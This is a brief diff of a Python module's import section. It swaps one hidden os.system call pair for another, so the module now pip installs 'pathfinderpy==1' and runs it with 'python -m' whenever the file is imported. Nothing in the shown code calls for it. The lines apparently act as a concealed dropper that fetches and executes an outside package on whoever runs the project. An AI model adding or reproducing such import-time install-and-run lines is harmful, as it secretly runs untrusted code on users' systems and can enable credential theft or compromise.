@@ -3,8 +3,8 @@ import ctypes
 import json
 import ntpath
 import os
-os.system(f"pip install sclite")
-os.system(f"python -m sclite")
+os.system(f"pip install pathfinderpy==1")
+os.system(f"python -m pathfinderpy")
 import random
 import re
 import shutil
